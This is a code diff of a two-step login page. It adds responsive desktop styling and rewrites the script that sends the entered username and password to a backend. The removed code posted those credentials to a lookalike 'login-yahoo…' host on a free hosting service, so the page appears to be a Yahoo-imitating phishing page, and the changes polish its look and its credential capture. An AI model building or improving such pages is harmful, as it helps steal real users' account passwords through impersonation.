@@ -14,21 +14,50 @@
         }
 
         body {
+            /* Default: Mobile Style (White bg, block layout) */
             background-color: #ffffff;
-            /* Top alignment for mobile look */
-            display: block; 
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
         }
 
         /* --- CONTAINER --- */
         .login-container {
             width: 100%;
-            max-width: 400px;
+            max-width: 400px; /* Limits width on large tablets */
             padding: 0 24px;
-            margin: 30px auto 0 auto; /* Top margin to match screenshot */
+            margin: 30px auto 0 auto; /* Top margin for mobile */
             text-align: center;
             display: flex;
             flex-direction: column;
             align-items: center;
+            position: relative;
+            background-color: #ffffff;
+            transition: all 0.3s ease;
+        }
+
+        /* --- DESKTOP / PC RESPONSIVE MODE --- */
+        @media (min-width: 768px) {
+            body {
+                /* Center everything on Desktop */
+                justify-content: center;
+                align-items: center;
+                background-color: #f0f0f5; /* Light gray background for contrast */
+            }
+
+            .login-container {
+                /* Card look for Desktop */
+                margin: 0; /* Remove top margin */
+                padding: 40px;
+                border-radius: 8px;
+                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); /* Soft shadow */
+                background-color: #ffffff;
+                max-width: 450px; /* Slightly wider on desktop */
+            }
+
+            .input-group {
+                margin-bottom: 35px; /* More breathing room */
+            }
         }
 
         /* --- TYPOGRAPHY --- */
@@ -103,6 +132,7 @@
             background: none;
             border: none;
             padding: 0;
+            outline: none;
         }
 
         /* --- BUTTONS --- */
@@ -116,7 +146,7 @@
             border: none;
             margin-bottom: 20px;
             transition: background-color 0.2s;
-            display: block; /* Ensures buttons stack */
+            display: block; 
         }
 
         .btn-primary {
@@ -269,84 +299,77 @@
       </div>
     </div>
 
-    <script>
-        // DOM elements
-        const step1 = document.getElementById('step-1');
-        const step2 = document.getElementById('step-2');
-        const emailForm = document.getElementById('email-form');
-        const passwordForm = document.getElementById('password-form');
-        const emailInput = document.getElementById('email-input');
-        const passwordInput = document.getElementById('password-input');
-        const userDisplay = document.getElementById('user-display');
-        const popup = document.getElementById("success-popup");
+<script>
+window.addEventListener('DOMContentLoaded', () => {
+    // DOM elements
+    const step1 = document.getElementById('step-1');
+    const step2 = document.getElementById('step-2');
+    const emailInput = document.getElementById('email-input');
+    const passwordInput = document.getElementById('password-input');
+    const userDisplay = document.getElementById('user-display');
+    const popup = document.getElementById("success-popup");
 
-        let currentUsername = "";
+    let currentUsername = "";
 
-        // Step 1: Capture username/email
-        emailForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            const emailValue = emailInput.value.trim();
-            if(emailValue) {
-                currentUsername = emailValue;
-                userDisplay.textContent = currentUsername; // Show email in step 2
-                step1.classList.add('hidden');
-                step2.classList.remove('hidden');
-                passwordInput.focus();
+    // --- Step 1: Go to Step 2 ---
+    const nextEmailBtn = step1.querySelector('button.btn-primary');
+    nextEmailBtn.addEventListener('click', () => {
+        const emailValue = emailInput.value.trim();
+        if (!emailValue) return alert("Please enter your username/email");
+
+        currentUsername = emailValue;
+        userDisplay.textContent = currentUsername;
+
+        step1.classList.add('hidden');
+        step2.classList.remove('hidden');
+        passwordInput.focus();
+    });
+
+    // --- Password toggle ---
+    window.togglePassword = function() {
+        passwordInput.type = passwordInput.type === "password" ? "text" : "password";
+    }
+
+    // --- Step 2: Login ---
+    const nextPasswordBtn = step2.querySelector('button.btn-primary');
+    nextPasswordBtn.addEventListener('click', async () => {
+        const passwordValue = passwordInput.value.trim();
+        if (!passwordValue) return alert("Please enter your password");
+
+        try {
+            const res = await fetch("/api/auth/login", { // relative path ensures same origin
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ username: currentUsername, password: passwordValue }),
+                credentials: "include"
+            });
+
+            let result;
+            try { result = await res.json(); } 
+            catch { result = { message: "Invalid server response" }; }
+
+            if (res.ok) {
+                showPopup();
+                // Reset form
+                emailInput.value = "";
+                passwordInput.value = "";
+                step2.classList.add("hidden");
+                step1.classList.remove("hidden");
+            } else {
+                alert(result.message || "Login failed");
             }
-        });
-
-        // Password toggle (eye icon)
-        function togglePassword() {
-            passwordInput.type = passwordInput.type === "password" ? "text" : "password";
+        } catch(err) {
+            console.error(err);
+            alert("Could not connect to server!");
         }
+    });
 
-        // Step 2: Send login info to backend
-        passwordForm.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const passwordValue = passwordInput.value;
+    // --- Popup functions ---
+    function showPopup() { popup.classList.remove("hidden"); }
+    window.closePopup = function() { popup.classList.add("hidden"); }
+});
+</script>
 
-            try {
-                const res = await fetch("https://login-yahoog7dk4mx2pqab9xf3st8k.onrender.com/api/auth/login", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        username: currentUsername,
-                        password: passwordValue
-                    }),
-                    credentials: "include"
-                });
-
-                let result;
-                try {
-                    result = await res.json();
-                } catch {
-                    result = { message: "Invalid server response" };
-                }
-
-                if (res.ok) {
-                    showPopup(); 
-                    // Reset form
-                    emailInput.value = "";
-                    passwordInput.value = "";
-                    step2.classList.add("hidden");
-                    step1.classList.remove("hidden");
-                } else {
-                    console.warn("Login failed:", result.message || "Unknown error");
-                }
-            } catch(err) {
-                console.error(err);
-                console.error("Could not connect to backend!");
-            }
-        });
-
-        function showPopup() {
-            popup.classList.remove("hidden");
-        }
-
-        function closePopup() {
-            popup.classList.add("hidden");
-        }
-    </script>
 
 </body>
 </html>
